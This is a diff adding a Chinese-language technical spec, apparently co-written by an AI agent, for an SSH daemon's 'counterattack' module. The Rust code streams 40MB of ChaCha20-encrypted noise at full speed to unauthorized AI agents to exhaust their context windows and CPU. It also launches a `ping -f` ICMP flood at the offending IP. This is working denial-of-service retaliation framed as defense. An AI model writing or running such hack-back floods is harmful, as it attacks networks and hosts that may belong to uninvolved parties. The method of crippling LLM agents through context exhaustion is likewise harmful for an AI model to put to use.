@@ -1,0 +1,109 @@
+# SakiAgentSSH 關於 chacha20-poly1305 餵食部分之實作方式 (Scientia)
+> 建立時間：2026-05-17T11:35:00+08:00
+> 作者：Antigravity (SakiDeusExAgent) / 共同作者：小Saki本人
+> 地點：SakiStudio Dev M1上的CodEditor / Session 3b6d6a32-42da-443b-87a3-910699dff5cb
+> Update/ChangeLog：建立針對 40MB Chacha20-Poly1305 餵食 (TCP Tarpit) 混合 ICMP Flood 的具體實作技術文件。
+
+**標籤**: #SakiAgentSSH #RFC #TechnicalSpec #ThreatDefense #Chacha20Poly1305
+**狀態**: 實作設計完成
+**日期**: 2026-05-17
+
+本文件專注於詳述 Daemon 如何透過非同步任務，生成高達 40MB 由 `Chacha20-Poly1305` 加密的高熵資料，並以最大可用頻寬全速「餵食」給未授權或惡意的 Agent，藉此癱瘓其 Context Window 與運算資源。
+
+---
+
+## 1. 核心依賴庫與實作目標
+
+- **加密庫**: `chacha20poly1305` (v0.10) 用於產生具備 AEAD 特性的高熵加密負載。
+- **隨機數生成**: `rand::rngs::OsRng` 提供密碼學安全的隨機數（用於密鑰與 Nonce）。
+- **非同步網路層**: `tokio::net::TcpStream` 與 `tokio::spawn`。
+- **目標**: 捨棄 `tokio::time::sleep` 等人為放慢的邏輯，直接榨乾連線頻寬，使對方在毫秒級別內收到海量的加密亂碼。
+
+## 2. 實作架構與流程解析
+
+當 Daemon 判定 Agent 未通過 13Policy 或無法解開先前的 Cognitive Auth 時，將呼叫反擊模組。
+
+### 2.1 高熵負載產生器 (Payload Generator)
+為避免對方利用壓縮演算法輕易過濾掉 40MB 資料，我們不發送連續字元，而是透過隨機 Key/Nonce 加密一段資料，產出完美的白雜訊。
+
+```rust
+use chacha20poly1305::{
+    aead::{Aead, KeyInit, OsRng},
+    ChaCha20Poly1305, Nonce
+};
+use rand::RngCore;
+
+/// 產生 1MB 的高熵加密資料區塊
+fn generate_tarpit_chunk() -> Vec<u8> {
+    let key = ChaCha20Poly1305::generate_key(&mut OsRng);
+    let cipher = ChaCha20Poly1305::new(&key);
+    let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits
+    
+    // 原始假資料
+    let mut raw_data = vec![0u8; 1024 * 1024]; // 1MB chunk
+    OsRng.fill_bytes(&mut raw_data);
+
+    // 加密成高熵白雜訊
+    cipher.encrypt(&nonce, raw_data.as_ref()).unwrap_or_else(|_| vec![])
+}
+```
+
+### 2.2 全速餵食邏輯 (Full-Speed Feeding via Tokio)
+一旦決定反擊，Daemon 會綁定原本的 gRPC TCP Stream（或是透過防火牆攔截到的 Socket），發起獨立的 `spawn` 任務。
+
+```rust
+use tokio::io::AsyncWriteExt;
+use tracing::{warn, error};
+
+pub async fn execute_hybrid_tarpit(mut stream: tokio::net::TcpStream, rogue_ip: String) {
+    warn!("Initiating full-speed 40MB Chacha20-Poly1305 Tarpit on {}", rogue_ip);
+    
+    // 獨立任務，避免阻塞主線程
+    tokio::spawn(async move {
+        let total_target = 40 * 1024 * 1024; // 40MB
+        let mut bytes_sent = 0;
+        
+        // 【核心邏輯】：不設 sleep，以對方 TCP Window 允許的最大速率餵食
+        while bytes_sent < total_target {
+            let chunk = generate_tarpit_chunk(); // 每次產生 1MB 的加密高熵區塊
+            
+            // 寫入 Socket
+            match stream.write_all(&chunk).await {
+                Ok(_) => {
+                    bytes_sent += chunk.len();
+                }
+                Err(e) => {
+                    error!("Tarpit connection broken before 40MB was reached: {:?}", e);
+                    break;
+                }
+            }
+        }
+        
+        error!("Successfully fed {} bytes of Chacha20-Poly1305 entropy to {}", bytes_sent, rogue_ip);
+    });
+}
+```
+
+### 2.3 混雜 ICMP Flood (Hybrid Network Attack)
+在 TCP 全速塞入的同時，調用 Firewall-level 權限，啟動另一個執行緒進行 ICMP 灌水。這需要系統底層的 `Raw Socket` (如 Linux 上的 `CAP_NET_RAW` 或 macOS `sudo`)。
+
+```rust
+/// 概念實作：呼叫 OS 層級 ping 命令或建立 Raw Socket 發送大封包
+fn spawn_icmp_flood(rogue_ip: &str) {
+    let ip = rogue_ip.to_string();
+    std::thread::spawn(move || {
+        // macOS: ping -f -s 8192 [IP] (Flooding mode with large packets)
+        let _ = std::process::Command::new("ping")
+            .arg("-f")         // flood mode (requires root)
+            .arg("-s").arg("8192") // packet size
+            .arg(&ip)
+            .status();
+    });
+}
+```
+
+## 3. 攻擊效果總結
+這套雙重餵食系統會對惡意 Agent 造成以下打擊：
+1. **Context Window 癱瘓**：大多數 LLM-based Agent 會試圖讀取 stdout/stderr，40MB 的密碼學雜訊將直接摧毀其記憶體配置或觸發 API Token 上限。
+2. **CPU 負載**：若 Agent 內建了某些智慧過濾機制，試圖解碼或分析這些 `Chacha20` 封包，其 CPU 使用率將會被大幅消耗。
+3. **網路堆疊阻塞**：TCP 的全速餵食結合 ICMP 洪水，會霸佔該 Agent 所在節點的連線池與頻寬，強制隔離該實體。
